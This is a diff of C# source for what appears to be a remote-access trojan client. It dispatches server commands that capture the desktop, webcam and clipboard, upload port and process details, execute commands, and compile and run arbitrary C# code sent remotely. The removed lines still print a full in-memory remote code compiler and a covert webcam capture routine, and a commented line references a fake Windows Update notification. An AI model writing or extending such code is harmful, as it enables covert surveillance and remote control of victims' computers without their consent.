@@ -16,8 +16,6 @@ using Ionic.Zip;
 using Ionic.Zlib;
 using System.Reflection;
 using PluginManager;
-using Microsoft.CSharp;
-using System.CodeDom.Compiler;
 
 namespace Client
 {
@@ -53,30 +51,34 @@ namespace Client
             //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
         }
 
+        void AppendText(string text)
+        {
+            richTextBox1.AppendText(string.Format("{0:G}", DateTime.Now) + " : " + text + Environment.NewLine);
+        }
+
         void Instance_OnAuthorizedEvent(object sender, AuthEventArgs e)
         {
-            //if (e.IsAuthenticated)
+            if (e.IsAuthenticated)
             {
                 AppendText("Authorized");
             }
         }
 
-        void AppendText(string text)
-        {
-            richTextBox1.AppendText(text + Environment.NewLine);
-        }
-
-        void Instance_OnCommandEvent(object sender, ECommand e)
+        void Instance_OnCommandEvent(object sender, CommandEventArgs e)
         {
             var s = Handler.Instance.Transmitter.TSettings;
-            AppendText("Command: " + e + ", File: " + s.File + ", Parameters: " + s.Parameters);
-            switch (e)
+            if (e.Command != ECommand.DO_NOTHING)
+            {
+                AppendText("Command: " + e.Command + ", File: " + s.File + ", Parameters: " + s.Parameters);
+            }
+            UploadResult result = null;
+            switch (e.Command)
             {
                 case ECommand.SET_TRANSMISSION_INTERVAL:
                     Handler.Instance.SetTransmissionInterval();
                     break;
                 case ECommand.UPLOAD_IMAGE:
-                    Handler.Instance.UploadDesktopImage();
+                    result = Handler.Instance.UploadDesktopImage();
                     break;
                 case ECommand.EXECUTE_COMMAND:
                     Handler.Instance.ExecuteCommand();
@@ -85,15 +87,10 @@ namespace Client
                     Handler.Instance.UploadClipboardData();
                     break;
                 case ECommand.UPLOAD_WEBCAM_IMAGE:
-                    {
-                        long quality = 95;
-                        long.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out quality);
-                        var bitmapImage = GetWebCamImage();
-                        Handler.Instance.Transmitter.UploadImage("webcam.jpg", bitmapImage, quality);
-                    }
+                    Handler.Instance.UploadWebcamImage();
                     break;
                 case ECommand.UPLOAD_PORT_INFO:
-                    Handler.Instance.UploadPortInfo();
+                    result = Handler.Instance.UploadPortInfo();
                     break;
                 case ECommand.UPLOAD_PROCESS_INFO:
                     Handler.Instance.UploadProcessInfo();
@@ -134,58 +131,10 @@ namespace Client
                     UploadPlugin();
                     break;
                 case ECommand.EXECUTE_CODE:
-                    ExecuteCode();
+                    Handler.Instance.ExecuteCode();
                     break;
             }
-        }
-
-        private void ExecuteCode()
-        {
-            string code = @"
-    using System;
-    using System.Drawing;
-    using System.Text;
-    using System.Windows.Forms;
-    using System.IO;
-    namespace Client
-    {
-        public class Program
-        {
-            public static void Main()
-            {
-            " +
-        Handler.Instance.Transmitter.TSettings.Parameters
-        + @"
-            }
-        }
-    }
-";
-
-            CSharpCodeProvider provider = new CSharpCodeProvider();
-            CompilerParameters parameters = new CompilerParameters();
-            parameters.ReferencedAssemblies.Add("System.dll");
-            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
-            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
-            parameters.GenerateInMemory = true;
-            parameters.GenerateExecutable = true;
-            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
-            if (results.Errors.HasErrors)
-            {
-                StringBuilder sb = new StringBuilder();
-                foreach (CompilerError error in results.Errors)
-                {
-                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
-                }
-                Handler.Instance.Transmitter.UploadData("exception.txt", sb.ToString(), false);
-            }
-            Assembly assembly = results.CompiledAssembly;
-            Type program = assembly.GetType("Client.Program");
-            MethodInfo main = program.GetMethod("Main");
-            try
-            {
-                main.Invoke(null, null);
-            }
-            catch { }
+            Handler.Instance.UploadResult(result);
         }
 
         private void UploadPlugin()
@@ -219,35 +168,6 @@ namespace Client
             }
         }
 
-        private Bitmap GetWebCamImage(int id = 0)
-        {
-            Bitmap image = null;
-            var webCameraControl = new WebEye.WebCameraControl();
-            WebEye.WebCameraId camera = null;
-            try
-            {
-                camera = (webCameraControl.GetVideoCaptureDevices() as List<WebEye.WebCameraId>)[id];
-            }
-            catch { }
-            //foreach (WebEye.WebCameraId c in webCameraControl.GetVideoCaptureDevices())
-            //{
-            //    if (c != null)
-            //    {
-            //        camera = c;
-            //        break;
-            //    }
-            //}
-            if (camera != null)
-            {
-                webCameraControl.StartCapture(camera);
-                System.Threading.Thread.Sleep(2000);
-                image = webCameraControl.GetCurrentImage();
-                System.Threading.Thread.Sleep(250);
-                webCameraControl.StopCapture();
-            }
-            return image;
-        }
-
         private void ExecutePlugin()
         {
             if (pluginManager != null)
@@ -259,9 +179,6 @@ namespace Client
                     try
                     {
                         data = plugin.Client.Execute(Handler.Instance.Transmitter.TSettings.Parameters);
-                        //var path = Environment.CurrentDirectory + "\\temp.bmp";
-                        //var image = data as Bitmap;
-                        //image.Save(path);
                     }
                     catch (Exception ex)
                     {
